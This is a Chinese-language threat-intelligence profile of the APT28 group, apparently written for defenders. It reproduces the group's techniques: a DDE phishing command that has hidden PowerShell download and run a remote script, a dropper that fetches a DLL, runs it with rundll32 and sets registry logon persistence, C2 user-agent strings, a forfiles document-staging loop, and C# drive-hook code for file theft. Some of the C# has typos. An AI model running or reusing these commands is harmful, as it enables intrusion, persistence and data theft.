# APT28

## 特征

1. 使用DDE制作Microsoft Word钓鱼文档时，通过隐藏字段执行命令

```bash
C:\\Programs\\Microsoft\\Office\\MSWord.exe\\..\\..\\..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -sta -NonI -W Hidden $e=(New-Object System.Net.WebClient).DownloadString('http://Url地址/config.txt');
//运行PowerShell不加载配置文件、单线程启动、不向受害者显示交互提示并隐藏窗口
powershell -enc $e #.EXE  
//使用-enc选项运行经过Base64编码过的脚本
```

该命令会从Url地址下载一个config.txt名称的文本文件，然后调用该文本文件中的命令执行，该文本文件内容是Base64编码，可使用Base64解密.

```bash
$W=New-Object System.Net.WebClient;
$p=($Env:ALLUSERSPROFILE+”\vms.dll”);  
//使用用户配置文件位置
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
$W.DownloadFile(“http://Url地址/media/resource/vms.dll “,$p);  
//指定下载地址和下载到的路径
if (Test-Path $p){
$rd_p=$Env:SYSTEMROOT+”\System32\rundll32.exe”;  
//使用rundll32.exe运行dll文件
$p_a=$p+”,#1″;
$pr=Start-Process $rd_p -ArgumentList $p_a;
//启动进程并使用参数为变量$p_a;
$p_bat=($Env:ALLUSERSPROFILE+”\vms.bat”);
//创建vms.bat文件
$text=’set inst_pck = “%ALLUSERSPROFILE%\vms.dll”‘+”`r`n”+’if NOT exist %inst_pck % (exit)’+”`r`n”+’start rundll32.exe %inst_pck %,#1’
[io.File]::WriteAllText($p_bat,$text)
New-Item -Path ‘HKCU:\Environment’ -Force | Out-Null;
//写入vms.bat文件内容
New-ItemProperty -Path ‘HKCU:\Environment’ -Name ‘UserInitMprLogonScript’ -Value “$p_bat” -PropertyType String -Force | Out-Null;
//使用UserInitMprLogonScript注册表项允许脚本自启动
}
```

2. 该组织的命令控制器曾经使用过硬编码的用户代理请求

```bash
Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; InfoPath.1)

Mozilla/5.0 (Windows NT 6.1; WOW64) WinHttp/1.6.3.8 (WinHTTP/5.1) like Gecko

Mozilla v5.1 (Windows NT 6.1; rv:6.0.1) Gecko/20100101 Firefox/6.0.1
```

3. 窃取文件时会使用Forfile批处理命令来暂存文件

```bash
for %%G in (.pdf, .xls, .xlsx, .doc, .docx) do (
   forfiles /P F:[REDACTED] /m *%%G /s /d +01.05.2015 /c "cmd /c copy @path
C:ProgramData[REDACTED]d@file" )
```

4. 该组织的恶意软件会安装一个应用程序定义的Windows挂钩（如代码清单1.5所示），该挂钩用来获取何时连接网络驱动器的Windows消息，添加网络驱动器后，钩子会调用窃取文件功能.

```C
protected override void WndProc(ref Nessage message)  //定义回调函数指针
{
    base.WndProc(ref message);
    if (message.Msg != 537 || message.LParam == IntPtr.Zero)
    {
	return;
    }
Form1.DEV_BROADCAST_VOLUME dEV_BROADCAST_VOLUNE = (Form1.DEV_BROADCAST_VOLUNE)
//包含逻辑卷的信息
    Marshal.PtrToStructure(message.LParam，typeof(Formi.DEV_BROADCAST_VOLUME));
    if (dEV_BROADCAST_vOLUME.dbcv_devicetype == 2)
    {
	int num = message.wParam.ToInt32();
	if (num != 32768)
	{
	    if (num != 32772)
	    {
		return;
	    }
	}
	else
	{
	    this.Driver = this.ToDriveName(dEv_BROADCAST_VOLUME.dbcv_unitmask);
        //指定驱动器名称
	    this.RecordToFile();
	}
}
```
